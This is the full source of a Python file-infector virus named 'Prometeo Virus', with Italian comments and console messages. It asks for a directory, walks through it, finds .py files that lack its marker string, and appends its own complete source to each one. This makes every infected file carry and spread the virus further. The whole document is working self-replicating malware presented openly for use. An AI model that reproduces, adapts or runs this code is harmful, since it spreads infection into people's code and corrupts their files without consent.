#!usr/bin/pyhton
import os, sys, shutil, random, glob, time

viruskey = "#! My Virus Key: 1x2y3z"
infettato = "No"
banner = """
+-----------------+----------------+
| Prometeo Virus | Coded by Godlik |
+----------------+-----------------+
| Versione: 1.4  | Data: 11/1/2017  |
+----------------+-----------------+
	  """
myself = sys.argv[0]

#1 indentificazione

def identificazione(mypath):

	_path_ = os.getcwd()
	for path, directory, files in os.walk(_path_):
		for file in files:
			if not file == myself:
				time.sleep(0.5)
				_file_, punto, estensione = file.partition('.')
				if estensione == "py":
					try:
						infettato = "No"
						fileopen = open(file, 'r')
						for line in fileopen:
							if viruskey in line:
								infettato = "Si"
								print("[*] File gia' infettato > " + file)
								break
						if infettato == "No":
							print("[+] Infetto il file... " + file)
							infezione_exploit(file, mypath)
					except FileNotFoundError:
						pass

#2 Infezione

#exploit = """"""
def infezione_exploit(file, mypath):

	exploitstatus = "No"
	exploit =  "#"
	print("\n[*] Preparo l'Exploit...")
	try:
		_file_ = open(file, 'a')
		_file_.write("\n" + exploit)
		exploitstatus = "Si"
		_file_.close()
	except FileNotFoundError:
		pass
	if exploitstatus == "Si":
		print("[+] Infezione Riuscita")
		print("[*] Mi copio nel file...")
		infezione_myself(file, mypath)

#3 Infezione (Inietto tutto il virus)

def infezione_myself(file, mypath):

	_myself_ = open(mypath, 'r')
	file = open(file, 'a')
	for line in _myself_:
		file.write(str(line))
	print("[+] File infettato Correttamente!")
	file.close()
	_myself_.close()

# If name in Main

if __name__ == '__main__':

	print(banner)
	try:
		directory = input("Path >> ")
		mypath = os.getcwd() + "\\" + sys.argv[0]
		print(mypath)
		os.chdir(directory)
	except FileNotFoundError :
		print("[!] Path non Trovata")
		exit
	identificazione(mypath)
